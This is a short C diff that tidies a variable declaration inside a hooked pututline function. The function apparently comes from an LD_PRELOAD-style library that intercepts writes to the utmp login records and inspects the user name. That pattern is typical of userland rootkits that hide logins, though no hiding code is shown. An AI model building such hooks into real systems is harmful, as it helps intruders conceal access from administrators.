@@ -6,8 +6,7 @@ struct utmp *pututline(const struct utmp *ut)
 
     HOOK(old_pututline, CPUTUTLINE);
 
-    struct utmp *tmp;
-    tmp = old_pututline(ut);
+    struct utmp *tmp = old_pututline(ut);
 
     if(tmp && tmp->ut_user != NULL)
     {
